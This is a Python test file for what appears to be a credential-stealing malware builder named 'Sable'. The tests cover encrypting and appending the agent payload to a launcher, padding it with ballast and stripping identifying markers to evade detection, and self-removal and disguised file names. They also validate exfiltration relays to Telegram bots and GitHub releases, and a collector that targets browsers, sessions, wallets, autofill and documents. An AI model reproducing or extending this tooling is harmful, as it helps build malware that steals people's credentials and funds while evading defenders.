"""The contracts that hold the build together, tested where the halves meet.

Four seams decide whether an artifact runs, and each of them is a place where two
modules have to agree without either importing the other:

1. **Seal and loader.** ``core/seal.py`` writes the blob; ``agent/loader.py`` reads it.
   ``core/`` may not import ``agent/``, so the byte layout is declared twice on
   purpose. This file seals with one and opens with the other, and pins the constants
   equal, so a change to one half without the other is a red test instead of a
   failure discovered on a machine that cannot be debugged.
2. **Forge and loader, again.** The footer offset is written by ``core/forge.py`` and
   parsed by ``agent/loader.py``. The container is built here and read back with the
   loader's own functions, which is the only check that proves the two agree.
3. **Payload and schema.** The archive carries ``core/schema.py`` verbatim and a
   ``cfg.json`` produced by the same ``to_dict`` the agent reads with, so a built
   artifact can never carry a config its own reader would reject.
4. **Pipeline and everything.** One call, six stages, one outcome, and a failed
   rename that keeps the artifact rather than deleting a completed build.

Everything here runs on a temporary directory and touches no user state. The seal
tests need pycryptodome, which is a runtime dependency of the build path; they skip
rather than fail on a box that does not have it, because the import and config tests
must still be runnable there.
"""

from __future__ import annotations

import ast
import importlib.util
import io
import json
import os
import sqlite3
import struct
import sys
import zipfile
from dataclasses import FrozenInstanceError
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import entry, loader, util  # noqa: E402
from core import forge, pipeline, rename, schema, seal  # noqa: E402
from core import validate as validate_module  # noqa: E402
from core.schema import (  # noqa: E402
    RELAY_KINDS,
    SOURCE_FIELDS,
    RelayConfig,
    RelayTarget,
    RunConfig,
    SourceConfig,
    VersionConfig,
    from_dict,
    to_dict,
)

CRYPTO = importlib.util.find_spec("Crypto") is not None
needs_crypto = pytest.mark.skipif(not CRYPTO, reason="pycryptodome is not installed")

MUTEX = "Global\\SABLE_CONTRACT_MUTEX_9f2c"
SEAL_KEY = "k-3f9a-contract-key"
TELEGRAM = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw$42"
# Owner/name before the $, token after. The token shape is checked, never its
# validity: a validator that insists on a live token cannot run offline.
PHANTOM = "ytripdame-sudo/archive$ghp_" + "a" * 32


def config(**overrides: object) -> RunConfig:
    """A config that passes every rule, with named fields overridden."""
    base: dict[str, object] = {
        "schema_version": 1,
        "mutex": MUTEX,
        "seal_key": SEAL_KEY,
        "relay": RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        "sources": SourceConfig(),
        "self_remove": False,
        "ballast_mb": 0,
    }
    base.update(overrides)
    return RunConfig(**base)  # type: ignore[arg-type]


@pytest.fixture()
def stub(tmp_path: Path) -> Path:
    path = tmp_path / "launcher.bin"
    path.write_bytes(os.urandom(4096))
    return path


# --- seal and loader: the same bytes, described twice -----------------------


@needs_crypto
def test_seal_and_loader_agree_on_the_layout() -> None:
    plaintext = b"the archive" * 200
    blob = seal.seal(plaintext, SEAL_KEY)

    assert len(blob) == seal.sealed_size(len(plaintext))
    assert len(blob) == len(plaintext) + seal.SALT_SIZE + seal.NONCE_SIZE + seal.TAG_SIZE
    assert loader._open_sealed(blob, SEAL_KEY) == plaintext


def test_seal_constants_are_pinned_to_the_loader() -> None:
    """The duplication is deliberate; drift is not."""
    assert loader.SALT_SIZE == seal.SALT_SIZE
    assert loader.NONCE_SIZE == seal.NONCE_SIZE
    assert loader.TAG_SIZE == seal.TAG_SIZE
    assert loader.KDF_ITERATIONS == seal.KDF_ITERATIONS
    assert loader.FOOTER_SIZE == forge.FOOTER_SIZE
    assert loader.TRAILER_KEY_SLOT == forge.KEY_SLOT
    assert loader.TRAILER_MUTEX_SLOT == forge.MUTEX_SLOT
    assert loader.TRAILER_SIZE == forge.TRAILER_SIZE


def test_the_key_and_mutex_slots_fit_what_validate_accepts() -> None:
    """A form that passes must always produce a trailer forge can write."""
    assert validate_module.MAX_SEAL_KEY_LENGTH == forge.KEY_SLOT
    assert validate_module.MAX_MUTEX_LENGTH * 4 <= loader.TRAILER_MUTEX_SLOT


@needs_crypto
def test_two_seals_of_the_same_bytes_differ() -> None:
    """Fresh salt and nonce every time, so equal payloads are not visibly equal."""
    plaintext = b"identical input"
    first = seal.seal(plaintext, SEAL_KEY)
    second = seal.seal(plaintext, SEAL_KEY)

    assert first != second
    assert first[seal.SALT_SIZE + seal.NONCE_SIZE:][: len(plaintext)] != plaintext


@needs_crypto
def test_wrong_key_and_damaged_blob_both_fail_closed() -> None:
    blob = seal.seal(b"payload", SEAL_KEY)

    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(blob, "not-the-key")

    damaged = bytearray(blob)
    damaged[-1] ^= 0xFF
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(bytes(damaged), SEAL_KEY)

    # Header with no ciphertext is not a seal, however readable the header is.
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(blob[: seal.SEALED_OVERHEAD], SEAL_KEY)


@needs_crypto
def test_empty_key_and_empty_plaintext_are_refused() -> None:
    with pytest.raises(seal.SealError):
        seal.seal(b"payload", "")
    with pytest.raises(seal.SealError):
        seal.seal(b"", SEAL_KEY)
    with pytest.raises(seal.SealError):
        seal.sealed_size(-1)


# --- payload ----------------------------------------------------------------


def test_payload_carries_the_whole_agent_tree() -> None:
    data = forge.payload(ROOT, config())
    assert data[:2] == b"PK"

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        names = archive.namelist()
        assert "agent/entry.py" in names
        assert forge.SCHEMA_MEMBER in names
        assert forge.CONFIG_MEMBER in names
        assert not any("__pycache__" in name for name in names)

        on_disk = {
            path.relative_to(ROOT).as_posix()
            for path in (ROOT / "agent").rglob("*.py")
            if "__pycache__" not in path.parts
        }
        shipped = {name for name in names if name.startswith("agent/")}
        assert shipped == on_disk, "the archive and agent/ disagree"


def test_payload_ships_the_loader_verbatim() -> None:
    """Nothing is patched on the way in; the trailer carries the two secrets."""
    data = forge.payload(ROOT, config())
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        shipped = archive.read("agent/loader.py")

    assert shipped == (ROOT / "agent" / "loader.py").read_bytes()

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        text = archive.read("agent/loader.py").decode("utf-8")
    assert MUTEX not in text
    assert SEAL_KEY not in text


def test_payload_copies_the_schema_byte_for_byte() -> None:
    data = forge.payload(ROOT, config())
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert archive.read(forge.SCHEMA_MEMBER) == (ROOT / "core" / "schema.py").read_bytes()


def test_payload_config_is_readable_by_the_schema_it_ships() -> None:
    cfg = config(
        relay=RelayConfig(kind="telegram", endpoint=TELEGRAM),
        sources=SourceConfig(system=False, documents=False),
        self_remove=True,
        ballast_mb=3,
    )
    data = forge.payload(ROOT, cfg)

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        document = json.loads(archive.read(forge.CONFIG_MEMBER))

    assert from_dict(document) == cfg


def test_trailer_carries_the_key_and_the_mutex_in_fixed_slots() -> None:
    block = forge.trailer(config())
    assert len(block) == forge.TRAILER_SIZE
    assert block[:4] != b"SBLK", "the family marker is gone; position is the format"

    key = block[: forge.KEY_SLOT]
    assert key.rstrip(b"\x00") == SEAL_KEY.encode("utf-8")
    assert len(key) == forge.KEY_SLOT

    mutex = block[forge.KEY_SLOT :]
    assert mutex.rstrip(b"\x00") == MUTEX.encode("utf-8")
    assert len(mutex) == forge.MUTEX_SLOT


def test_trailer_refuses_a_value_that_does_not_fit_its_slot() -> None:
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(seal_key="k" * (forge.KEY_SLOT + 1)))
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(mutex="Global\\" + "m" * forge.MUTEX_SLOT))
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(mutex="Global\\SABLE\x00MUTEX"))


# --- container --------------------------------------------------------------


@needs_crypto
def test_exe_container_offset_and_footer(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)
    built = forge.build(config(), blob, tmp_path / "artifact.exe", mode="exe", stub=stub)

    raw = built.read_bytes()
    assert len(raw) == stub.stat().st_size + len(blob) + forge.TRAILER_SIZE + forge.FOOTER_SIZE
    assert raw[: stub.stat().st_size] == stub.read_bytes()

    footer = raw[-forge.FOOTER_SIZE:]
    assert int.from_bytes(footer, "little") == stub.stat().st_size
    assert footer != b"SBLT" + bytes(4)

    # The trailer sits between the sealed blob and the footer, so the blob ends
    # exactly where the trailer starts — and the trailer starts with the key, not a magic.
    trailer_start = len(raw) - forge.FOOTER_SIZE - forge.TRAILER_SIZE
    assert raw[trailer_start : trailer_start + forge.KEY_SLOT].rstrip(b"\x00") == SEAL_KEY.encode()
    assert raw[trailer_start - len(blob) : trailer_start] == blob


@needs_crypto
def test_the_trailer_returns_the_values_the_config_was_built_from(
    tmp_path: Path, stub: Path
) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )

    header = loader._read_trailer(built)
    assert header.seal_key == SEAL_KEY
    assert header.mutex == MUTEX
    assert loader._open_sealed(loader._read_sealed(built, loader._archive_offset(built)), header.seal_key) == data


@needs_crypto
def test_two_builds_share_a_launcher_and_keep_their_own_keys(
    tmp_path: Path, stub: Path
) -> None:
    """The whole point of the trailer: one freeze, any artifact."""
    other_key = "k-77bb-second-build"
    other_mutex = "Global\\SABLE_SECOND_MUTEX_4a1e"

    first_cfg = config()
    second_cfg = config(seal_key=other_key, mutex=other_mutex)

    first = forge.build(
        first_cfg,
        seal.seal(forge.payload(ROOT, first_cfg), first_cfg.seal_key),
        tmp_path / "one.exe",
        mode="exe",
        stub=stub,
    )
    second = forge.build(
        second_cfg,
        seal.seal(forge.payload(ROOT, second_cfg), second_cfg.seal_key),
        tmp_path / "two.exe",
        mode="exe",
        stub=stub,
    )

    assert loader._read_trailer(first).mutex == MUTEX
    assert loader._read_trailer(second).mutex == other_mutex
    assert loader._read_trailer(second).seal_key == other_key

    # Neither key opens the other artifact.
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(
            loader._read_sealed(second, loader._archive_offset(second)),
            loader._read_trailer(first).seal_key,
        )


@needs_crypto
def test_the_loader_reads_back_what_the_forge_wrote(tmp_path: Path, stub: Path) -> None:
    """The whole boot path minus the mutex: footer, seek, decrypt, unzip."""
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )

    offset = loader._archive_offset(built)
    assert offset == stub.stat().st_size

    sealed = loader._read_sealed(built, offset)
    recovered = loader._open_sealed(sealed, SEAL_KEY)
    assert recovered == data

    with zipfile.ZipFile(io.BytesIO(recovered)) as archive:
        assert "agent/entry.py" in archive.namelist()


@needs_crypto
def test_ballast_moves_the_offset_without_disturbing_the_payload(
    tmp_path: Path, stub: Path
) -> None:
    data = forge.payload(ROOT, config())
    padded = config(ballast_mb=2)
    built = forge.build(
        padded, seal.seal(data, SEAL_KEY), tmp_path / "padded.exe", mode="exe", stub=stub
    )

    mib = 1024 * 1024
    offset = loader._archive_offset(built)
    assert offset == stub.stat().st_size + 2 * mib
    assert forge.expected_offset(stub.stat().st_size, 2) == offset

    assert loader._open_sealed(loader._read_sealed(built, offset), SEAL_KEY) == data


@needs_crypto
def test_script_container_is_runnable_text_and_ignores_ballast(tmp_path: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)

    plain = forge.build(config(), blob, tmp_path / "one.py", mode="py")
    padded = forge.build(config(ballast_mb=64), blob, tmp_path / "two.py", mode="py")

    assert plain.stat().st_size == padded.stat().st_size

    text = plain.read_text(encoding="utf-8")
    assert compile(text, str(plain), "exec")
    assert f"SEAL_KEY = {SEAL_KEY!r}" in text
    assert f"MUTEX = {MUTEX!r}" in text
    assert "loader.acquire(MUTEX)" in text
    assert "loader.adopt(" in text
    assert text.startswith("#!/usr/bin/env python3")


@needs_crypto
def test_container_refuses_the_shapes_it_cannot_build(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)
    short = b"\x00" * 8

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "wrong.py", mode="exe", stub=stub)

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "no-stub.exe", mode="exe")

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "mode.exe", mode="dll", stub=stub)

    with pytest.raises(forge.ForgeError):
        forge.build(config(), short, tmp_path / "short.exe", mode="exe", stub=stub)

    empty = tmp_path / "empty.bin"
    empty.write_bytes(b"")
    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "empty-stub.exe", mode="exe", stub=empty)


@needs_crypto
def test_a_footer_that_is_not_there_is_refused(tmp_path: Path, stub: Path) -> None:
    plain = tmp_path / "not-an-artifact.exe"
    plain.write_bytes(stub.read_bytes())

    with pytest.raises(loader.ArchiveError):
        loader._archive_offset(plain)
    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(plain)

    tiny = tmp_path / "tiny.exe"
    tiny.write_bytes(b"MZ")
    with pytest.raises(loader.ArchiveError):
        loader._archive_offset(tiny)
    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(tiny)


@needs_crypto
def test_a_trailer_that_is_truncated_is_refused(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )
    raw = built.read_bytes()

    # Every length from "no trailer" to "one byte short" is refused, never guessed at.
    for cut in (0, 1, 4, forge.KEY_SLOT, forge.TRAILER_SIZE - 1):
        damaged = tmp_path / f"cut-{cut}.exe"
        damaged.write_bytes(raw[: len(raw) - forge.TRAILER_SIZE - forge.FOOTER_SIZE + cut])
        with pytest.raises(loader.ArchiveError):
            loader._read_trailer(damaged)


@needs_crypto
def test_an_empty_slot_is_refused_rather_than_silently_blank(tmp_path: Path) -> None:
    path = tmp_path / "blank.exe"
    block = b"\x00" * (forge.KEY_SLOT + forge.MUTEX_SLOT)
    path.write_bytes(b"\x00" * 64 + block + (0).to_bytes(8, "little"))

    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(path)


# --- rename -----------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("report", "report"),
        ("a:b", "a_b"),
        ("  spaced  ", "spaced"),
        ("trailing...", "trailing"),
        ("con", "_con"),
        ("CON.exe", "_CON.exe"),
        ("lpt9.log", "_lpt9.log"),
        ("Q3 summary", "Q3 summary"),
        # Control characters are replaced, not refused: a name that is only control
        # characters still has bytes left after the substitution, and underscores are
        # a legal filename.
        ("\x01\x02", "__"),
    ],
)
def test_sanitize_makes_a_windows_legal_name(raw: str, expected: str) -> None:
    assert rename.sanitize(raw) == expected


@pytest.mark.parametrize("raw", ["", "   ", "...", " . "])
def test_sanitize_refuses_a_name_with_nothing_left(raw: str) -> None:
    with pytest.raises(rename.RenameError):
        rename.sanitize(raw)


def test_sanitize_truncates_to_the_ceiling() -> None:
    cleaned = rename.sanitize("a" * 400)
    assert len(cleaned) == rename.MAX_NAME_LENGTH


@pytest.mark.parametrize("suffix", [".exe", ".py", ".EXE"])
def test_sanitize_suffix_normalises_case(suffix: str) -> None:
    assert rename.sanitize_suffix(suffix) == suffix.lower()


@pytest.mark.parametrize("suffix", ["", "e", "exe", ".a.b", ".exe ", ".e/x", ".e\\x"])
def test_sanitize_suffix_refuses_a_path_or_a_double_extension(suffix: str) -> None:
    with pytest.raises(rename.RenameError):
        rename.sanitize_suffix(suffix)


def test_generate_returns_a_legal_name_with_the_extension() -> None:
    for extension in (".exe", ".py"):
        name = rename.generate(extension)
        assert name.endswith(extension)
        assert rename.sanitize(name) == name
        assert "_" in name


def test_rename_never_overwrites(tmp_path: Path) -> None:
    first = tmp_path / "source.bin"
    first.write_bytes(b"one")
    second = tmp_path / "other.bin"
    second.write_bytes(b"two")

    landed = rename.rename(first, name="report.txt", directory=tmp_path)
    assert landed.name == "report.txt"

    clash = rename.rename(second, name="report.txt", directory=tmp_path)
    assert clash.name == "report_2.txt"
    assert landed.read_bytes() == b"one"
    assert clash.read_bytes() == b"two"


def test_rename_returns_the_same_path_when_the_name_already_matches(tmp_path: Path) -> None:
    source = tmp_path / "report.txt"
    source.write_bytes(b"x")
    assert rename.rename(source, name="report.txt", directory=tmp_path) == source


def test_rename_refuses_a_path_that_is_not_a_file(tmp_path: Path) -> None:
    with pytest.raises(rename.RenameError):
        rename.rename(tmp_path / "absent.bin", name="x.txt", directory=tmp_path)


# --- validate ---------------------------------------------------------------


def test_every_rule_is_declared_exactly_once() -> None:
    assert len(validate_module.RULES) == 6
    assert len(set(validate_module.RULES)) == 6


def test_a_good_form_produces_no_problems() -> None:
    assert validate_module.validate(config(), mode=forge.OUTPUT_PY) == []


def test_an_unknown_relay_kind_is_reported_under_the_endpoint_rule() -> None:
    """The kind and the endpoint are one form row, so they share a rule."""
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="carrier-pigeon", endpoint="https://x.test")),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert len(problems) == 1
    assert problems[0].rule == validate_module.RULE_ENDPOINT
    assert problems[0].path == "relay.kind"


def test_a_well_formed_mirror_adds_no_problem() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="link", endpoint="https://example.invalid/second"),),
    )
    assert validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY) == []


def test_an_empty_mirror_names_its_index() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="https", endpoint="   "),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "empty" in problems[0].message


def test_a_mirror_that_repeats_the_primary_is_refused() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="https", endpoint="https://example.invalid/relay"),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "already" in problems[0].message


def test_a_telegram_mirror_is_checked_by_the_telegram_rule() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="telegram", endpoint="not-a-token$42"),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "token" in problems[0].message
    assert validate_module.blocking(problems)


@pytest.mark.parametrize("kind", RELAY_KINDS)
def test_each_declared_kind_can_pass(kind: str) -> None:
    endpoint = {
        "telegram": TELEGRAM,
        "phantom": PHANTOM,
    }.get(kind, "https://example.invalid/relay")
    problems = validate_module.validate(
        config(relay=RelayConfig(kind=kind, endpoint=endpoint)),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert problems == []


@pytest.mark.parametrize(
    "endpoint",
    [
        "",
        "   ",
        "https://example.invalid/relay ",
        "ftp://example.invalid",
        "https://",
        "not a url",
        "example.invalid/relay",
    ],
)
def test_a_bad_https_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="https", endpoint=endpoint)), mode=forge.OUTPUT_PY
    )
    assert problems
    assert all(problem.path == "relay.endpoint" for problem in problems)
    assert validate_module.blocking(problems)


@pytest.mark.parametrize(
    "endpoint",
    ["", "token-only", "$42", "123:short$42", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", "a$b$c"],
)
def test_a_bad_telegram_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="telegram", endpoint=endpoint)), mode=forge.OUTPUT_PY
    )
    assert validate_module.blocking(problems)


@pytest.mark.parametrize(
    "endpoint",
    [
        "",
        "ytripdame-sudo/archive",
        "$" + "ghp_" + "a" * 32,
        "ytripdame-sudo/archive$",
        "noslash$ghp_" + "a" * 32,
        "a/b/c$ghp_" + "a" * 32,
        "/archive$ghp_" + "a" * 32,
        "ytripdame-sudo/$ghp_" + "a" * 32,
        "ytripdame-sudo/archive$short",
        # Dot-only segments satisfy the character class and are not repositories.
        # Formatted into the release URL they are path traversal, so the shape
        # check alone must not be the gate.
        "../..$ghp_" + "a" * 32,
        "./.$ghp_" + "a" * 32,
        ".../...$ghp_" + "a" * 32,
    ],
)
def test_a_bad_phantom_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="phantom", endpoint=endpoint)),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert problems
    assert all(problem.path == "relay.endpoint" for problem in problems)
    assert validate_module.blocking(problems)


def test_phantom_on_an_empty_repository_stops_instead_of_retrying(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # GitHub answers 422 for "tag exists" and for "Repository is empty". The first is
    # worth another name; the second never succeeds, and three attempts spent on it
    # report a tag collision that never happened.
    from agent import relay

    archive = tmp_path / "payload-sealed.zip"
    archive.write_bytes(b"archive")

    calls: list[str] = []

    def refuse(url: str, document: dict, token: str) -> tuple[int, bytes]:
        calls.append(str(document["tag_name"]))
        return 422, (
            b'{"message":"Validation Failed","errors":[{"resource":"Release",'
            b'"code":"custom","message":"Repository is empty."}]}'
        )

    monkeypatch.setattr(relay, "_gh_post", refuse)

    with pytest.raises(relay.RelayPermanent) as caught:
        relay._gh_release(
            "ytripdame-sudo",
            "SableResults",
            "ghp_" + "a" * 32,
            archive,
            "caption",
            "https://example.invalid/payload-sealed.zip",
        )

    assert "no commits" in str(caught.value)
    assert len(calls) == 1


def test_all_sources_off_is_blocking() -> None:
    problems = validate_module.validate(
        config(sources=SourceConfig(**{name: False for name in SOURCE_FIELDS})),
        mode=forge.OUTPUT_PY,
    )
    assert [problem.path for problem in problems] == ["sources"]
    assert validate_module.blocking(problems)


def test_ballast_on_a_script_is_a_note_not_a_stop() -> None:
    problems = validate_module.validate(config(ballast_mb=8), mode=forge.OUTPUT_PY)
    assert [problem.path for problem in problems] == ["ballast_mb"]
    assert problems[0].blocking is False
    assert validate_module.blocking(problems) == []


def test_seal_key_below_the_floor_is_blocking() -> None:
    problems = validate_module.validate(config(seal_key="short"), mode=forge.OUTPUT_PY)
    assert [problem.path for problem in problems] == ["seal_key"]
    assert problems[0].blocking is True


def test_seal_key_over_the_slot_is_blocking() -> None:
    """A key the trailer cannot carry must fail on the form, not at the write stage."""
    problems = validate_module.validate(
        config(seal_key="k" * (validate_module.MAX_SEAL_KEY_LENGTH + 1)), mode=forge.OUTPUT_PY
    )
    assert [problem.path for problem in problems] == ["seal_key"]
    assert str(validate_module.MAX_SEAL_KEY_LENGTH) in problems[0].message


def test_a_key_at_the_byte_ceiling_passes() -> None:
    exact = "k" * forge.KEY_SLOT
    assert validate_module.validate(config(seal_key=exact), mode=forge.OUTPUT_PY) == []


def test_a_name_without_an_extension_is_a_note() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, name="quarterly")
    assert [problem.path for problem in problems] == ["output.name"]
    assert problems[0].blocking is False


def test_a_name_with_the_wrong_extension_is_blocking() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, name="quarterly.exe")
    assert [problem.path for problem in problems] == ["output.name"]
    assert validate_module.blocking(problems)


def test_exe_mode_needs_a_launcher() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_EXE)
    assert [problem.path for problem in problems] == ["output.stub"]
    assert validate_module.blocking(problems)


def test_an_unknown_mode_short_circuits_the_mode_rules() -> None:
    problems = validate_module.validate(config(ballast_mb=999_999), mode="dll", name="nope.exe")
    assert [problem.path for problem in problems] == ["output.mode"]


def test_describe_is_capped_and_says_how_many_more() -> None:
    problems = [
        validate_module.Problem(rule="x", path=f"f{index}", message="bad") for index in range(9)
    ]
    line = validate_module.describe(problems, limit=3)
    assert line.count(";") == 3
    assert "and 6 more" in line


def test_describe_of_nothing_is_empty() -> None:
    assert validate_module.describe([]) == ""


def test_validate_never_raises_even_on_a_broken_config() -> None:
    """The contract is 'returns problems'. A caller must not have to guard the guard."""

    class Wrong:
        pass

    problems = validate_module.validate(Wrong(), mode=forge.OUTPUT_PY)  # type: ignore[arg-type]
    assert problems
    assert problems[0].rule == validate_module.RULE_INTERNAL


# --- pipeline ---------------------------------------------------------------


@needs_crypto
def test_run_produces_one_named_artifact(tmp_path: Path) -> None:
    out = tmp_path / "out"
    outcome = pipeline.run(
        config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="quarterly"
    )

    assert outcome.mode == forge.OUTPUT_PY
    assert outcome.artifact == out / "quarterly.py"
    assert outcome.artifact.is_file()
    assert outcome.size == outcome.artifact.stat().st_size
    assert outcome.seconds >= 0.0
    assert compile(outcome.artifact.read_text(encoding="utf-8"), "artifact", "exec")


@needs_crypto
def test_run_generates_a_name_and_creates_a_missing_directory(tmp_path: Path) -> None:
    out = tmp_path / "deep" / "nested" / "out"
    outcome = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY)

    assert outcome.artifact.parent == out
    assert outcome.artifact.suffix == ".py"
    assert rename.sanitize(outcome.artifact.name) == outcome.artifact.name


@needs_crypto
def test_run_reports_every_stage_once_and_in_order(tmp_path: Path) -> None:
    seen: list[tuple[str, float]] = []
    pipeline.run(
        config(),
        root=ROOT,
        out_dir=tmp_path / "out",
        mode=forge.OUTPUT_PY,
        progress=lambda event: seen.append((event.stage, event.fraction)),
    )

    stages = [stage for stage, _ in seen]
    assert stages[0] == pipeline.STAGE_VALIDATE
    assert stages[-1] == pipeline.STAGE_DONE
    assert set(stages) == set(pipeline.STAGES)

    fractions = [fraction for _, fraction in seen]
    assert fractions == sorted(fractions)
    assert fractions[0] == 0.0
    assert fractions[-1] == 1.0


@needs_crypto
def test_a_progress_callback_that_raises_does_not_take_the_build_with_it(
    tmp_path: Path,
) -> None:
    def hostile(event: pipeline.Event) -> None:
        raise RuntimeError("the UI died")

    outcome = pipeline.run(
        config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY, progress=hostile
    )
    assert outcome.artifact.is_file()


@needs_crypto
def test_an_invalid_form_carries_every_problem(tmp_path: Path) -> None:
    broken = config(seal_key="", relay=RelayConfig(kind="https", endpoint=""))

    with pytest.raises(pipeline.ValidationFailed) as caught:
        pipeline.run(broken, root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY)

    paths = {problem.path for problem in caught.value.problems}
    assert {"seal_key", "relay.endpoint"} <= paths
    assert caught.value.stage == pipeline.STAGE_VALIDATE
    assert not (tmp_path / "out").exists(), "nothing is written before the form passes"


@needs_crypto
def test_cancellation_stops_between_stages(tmp_path: Path) -> None:
    with pytest.raises(pipeline.PipelineCancelled) as caught:
        pipeline.run(
            config(),
            root=ROOT,
            out_dir=tmp_path / "out",
            mode=forge.OUTPUT_PY,
            cancel=lambda: True,
        )
    assert caught.value.stage == pipeline.STAGE_VALIDATE
    assert not (tmp_path / "out").exists()


@needs_crypto
def test_a_cancelled_build_does_not_leave_a_working_file(tmp_path: Path) -> None:
    """A build stopped after forging is removed, not left under a random name.

    The working name is random, so nothing ever revisits it: a cancel that leaks one
    leaves a full-size artifact in the output folder that the next run cannot see.
    """
    calls = {"n": 0}

    def cancel() -> bool:
        calls["n"] += 1
        return calls["n"] > 4

    out = tmp_path / "out"
    with pytest.raises(pipeline.PipelineCancelled) as caught:
        pipeline.run(
            config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, cancel=cancel
        )

    assert caught.value.stage == pipeline.STAGE_RENAME
    assert list(out.glob("sable-build-*")) == [], "the working artifact was left behind"


@needs_crypto
def test_a_failed_rename_keeps_the_artifact(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A build that finished is not thrown away because the name was rejected."""

    def refuse(*args: object, **kwargs: object) -> Path:
        raise rename.RenameError("report.txt: the name is taken")

    monkeypatch.setattr(pipeline.rename, "rename", refuse)

    with pytest.raises(pipeline.PipelineError) as caught:
        pipeline.run(config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY)

    assert isinstance(caught.value, pipeline.PipelineError)
    assert not isinstance(caught.value, pipeline.ValidationFailed)
    assert caught.value.stage == pipeline.STAGE_RENAME
    assert caught.value.artifact is not None
    assert caught.value.artifact.is_file()
    assert caught.value.artifact.name.startswith("sable-build-")


@needs_crypto
def test_two_runs_into_the_same_directory_do_not_collide(tmp_path: Path) -> None:
    out = tmp_path / "out"
    first = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="same")
    second = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="same")

    assert first.artifact != second.artifact
    assert first.artifact.is_file() and second.artifact.is_file()


def test_outcome_and_event_are_frozen() -> None:
    event = pipeline.Event(stage="seal", message="sealing", fraction=0.5)
    with pytest.raises(FrozenInstanceError):
        event.stage = "forge"  # type: ignore[misc]

    outcome = pipeline.Outcome(artifact=Path("x.py"), mode="py", size=1, seconds=0.1)
    with pytest.raises(FrozenInstanceError):
        outcome.size = 2  # type: ignore[misc]


# --- collector isolation ----------------------------------------------------


def registry_config() -> object:
    from types import SimpleNamespace

    flags = dict.fromkeys(
        ("system", "browsers", "sessions", "wallets", "autofill", "documents"), True
    )
    return SimpleNamespace(sources=SimpleNamespace(**flags))


